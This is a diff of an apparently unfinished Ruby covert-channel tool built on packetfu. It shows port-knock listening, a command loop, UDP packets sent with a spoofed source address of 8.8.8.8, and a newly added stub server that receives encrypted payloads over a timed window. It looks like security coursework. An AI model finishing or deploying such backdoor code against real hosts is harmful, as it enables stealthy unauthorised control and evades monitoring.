@@ -26,6 +26,7 @@ require 'packetfu'
 require 'openssl'
 require 'readline'
 require 'ipaddress'
+require 'socket'
 require_relative 'util.rb'
 
 ## Variables
@@ -96,12 +97,31 @@ def listen_for_knock
     puts "bottom"
 end
 
-def timer(port)
-  
-end
-
 def start_receiving_server(config)
-  puts config
+  cfg_items = config.split(',')
+  if cfg_items[0] == UDP
+    recv_thread = Thread.new {
+      puts "server started"
+      socket = UDPSocket.new
+      socket.bind('0.0.0.0', cfg_items[1].to_i)
+      max_time = cfg_items[2].to_i
+      timer = Thread.new {sleep max_time}
+      payload = nil
+      loop {
+        if timer.status == false #thread has completed
+          break
+        end
+        #check size for recv
+        #payload += decrpyt(socket.recv(1024))
+      }
+      puts "server ending"
+    }
+  elsif cfg_items[0] == TCP
+    #coming
+    puts TCP
+  else
+    #not implemented
+  end
 end
 
 def start_command_loop
@@ -136,9 +156,6 @@ def udp_packet(payload)
   config = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface=> $cfg_iface)).config
   udp_pkt = PacketFu::UDPPacket.new(:config => config, :flavor => "Linux")
 
-
-  #udp_pkt.eth_saddr = 
-  #udp_pkt.eth_daddr = b8:ac:6f:34:ad:d8 may not be needed
   udp_pkt.udp_dst = $cfg_pen_port
   udp_pkt.udp_src = rand(0xffff)
   udp_pkt.ip_saddr = "8.8.8.8"
